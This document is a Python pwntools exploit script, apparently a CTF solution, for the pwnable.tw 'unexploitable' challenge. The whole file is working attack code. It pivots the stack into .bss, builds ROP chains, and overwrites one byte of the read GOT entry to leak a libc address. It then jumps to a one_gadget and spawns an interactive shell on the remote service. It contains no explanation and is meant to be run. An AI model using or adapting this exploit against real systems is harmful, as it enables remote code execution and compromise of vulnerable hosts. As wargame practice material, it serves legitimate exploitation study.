from pwn import *

#p = process("./unexploitable", env={"LD_PRELOAD" : "./libc_64.so.6"})
p = remote("chall.pwnable.tw", 10403)
elf = ELF("./unexploitable")
libc = ELF("./libc_64.so.6")

sleep(3)

poprbp = 0x400512
read_main = 0x40055B 
leaveret = 0x400576
read_plt = 0x400430
movedi = 0x0000000000400600
sleep_plt = 0x400450

pay = "A" * 0x10 + p64(elf.bss())
pay += p64(read_main) + p64(leaveret)

p.sendline(pay)

sleep(1)
context.log_level='debug'
pay2 = p64(poprbp) + p64(elf.bss() + 24) + p64(leaveret) + p64(poprbp) + p64(elf.got['read'] + 0x10) + p64(read_main)
pay2 += p64(movedi) + "A"*48 + p64(1) + p64(read_plt) + p64(sleep_plt) + p64(movedi) + "A"*48 + p64(0) + p64(read_plt)	# pay3
pay2 += p64(poprbp) + p64(0x601070) + p64(leaveret)

pause()
p.sendline(pay2)
sleep(1)
pause()
p.send("\x7e")

leak = u64(p.recv(8)[0:])
print "0x%x" % leak

libc_base = leak - 0xf667e
system = libc_base + libc.symbols['system']
binsh = libc_base + 0x18C177
poprdi = libc_base + 0x0000000000021102

sleep(1)

pay3 = "A"*8 + p64(libc_base + 0xef6c4)#p64(poprdi) + p64(binsh) + p64(system)
p.send(pay3)
p.interactive()
